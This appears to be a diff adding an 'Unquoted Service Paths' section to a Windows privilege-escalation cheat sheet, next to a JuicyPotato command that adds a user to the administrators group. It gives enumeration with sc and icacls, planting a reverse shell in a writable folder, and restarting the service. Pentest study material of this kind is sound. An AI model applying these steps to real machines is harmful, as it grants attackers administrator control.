@@ -45,3 +45,31 @@ or
 .\JuicyPotato.exe -l 1337 -p C:\Windows\system32\cmd .exe -t {CLSID} -a "/c net localgroup administrators {MY_EXISTING_USER} /add"
 ```
 
+## Unquoted Service Paths
+```
+➤ 0. Explanation
+Windows would try to locate and execute programs in the following order:
+C:\Program.exe
+C:\Program Files\Some.exe
+C:\Program Files\Some Folder\Service.exe
+
+➤ 1. Find Services With Unquoted Paths
+• Using sc
+sc query
+sc qc service name
+
+• Using 
+Using WMIC
+
+➤ 2. Look for Binary_path_name (Binary with space) and for each of them, check if the path is unquoted ('').
+Vulnerable example: C:\Program Files\Some Folder\Service.exe
+
+➤ 3. Verify that we can write into one of the subfolder
+icacls "C:\Program Files\Some Folder\"
+
+➤ 4. Create a reverse shell named Some.exe in 'C:\Program Files\Some Folder\'
+
+➤ 6. Restart the service linked with service.exe
+sc stop SERVICENAME
+sc start SERVICENAME
+
